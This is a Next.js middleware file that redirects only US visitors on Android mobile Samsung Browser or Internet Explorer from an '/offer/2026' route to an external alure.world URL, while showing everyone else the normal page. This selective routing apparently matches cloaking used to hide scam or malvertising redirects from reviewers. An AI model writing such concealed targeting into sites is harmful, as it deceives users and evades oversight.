import { NextResponse, type NextRequest } from 'next/server';

/**
 * Target URL for eligible Android Mobile users in the US on supported browsers
 */
const TARGET_REDIRECT_URL = 'https://alure.world/1/2/3/4/5/6/7/8/9/10/11/12/13/14/15/16/17/18/19/20';

/**
 * Extracts country code from server headers (Vercel, Cloudflare, etc.) or request.geo
 */
function getGeoCountry(request: NextRequest): string {
  // Edge runtime geo object (e.g. Vercel)
  const edgeGeoCountry = (request as unknown as { geo?: { country?: string } }).geo?.country;
  if (edgeGeoCountry) {
    return edgeGeoCountry.trim().toUpperCase();
  }

  // Prioritize Vercel, Cloudflare, and other standard CDN headers
  const headerCandidates = [
    'x-vercel-ip-country',
    'cf-ipcountry',
    'cloudfront-viewer-country',
    'x-country-code',
    'x-client-ip-country',
    'x-real-ip-country',
  ];

  for (const header of headerCandidates) {
    const val = request.headers.get(header);
    if (val && val !== 'XX' && val !== 'T1') {
      return val.trim().toUpperCase();
    }
  }

  return '';
}

export function middleware(request: NextRequest) {
  const pathname = request.nextUrl.pathname;

  // Strict check for /offer/2026 route
  if (pathname === '/offer/2026' || pathname === '/offer/2026/') {
    // 1. User-Agent Detection
    const uaString = request.headers.get('user-agent') || '';
    const isAndroidMobile = /Android/i.test(uaString) && /Mobile/i.test(uaString);
    const isSamsungBrowser = /SamsungBrowser/i.test(uaString);
    const isInternetExplorer = /MSIE|Trident/i.test(uaString);
    const isAllowedBrowser = isSamsungBrowser || isInternetExplorer;

    // 2. Geolocation Detection
    const country = getGeoCountry(request);

    // 3. Execution Logic
    if (isAndroidMobile && isAllowedBrowser && country === 'US') {
      return NextResponse.redirect(TARGET_REDIRECT_URL, 307);
    }

    // Otherwise, allow standard request progression (NextResponse.next())
    const response = NextResponse.next();
    if (country) {
      response.cookies.set('x-geo-country', country, { path: '/', httpOnly: false });
    }
    return response;
  }

  return NextResponse.next();
}

// Next.js 16+ compatibility: support both named exports
export const proxy = middleware;
export default middleware;

export const config = {
  matcher: ['/offer/2026', '/offer/2026/'],
};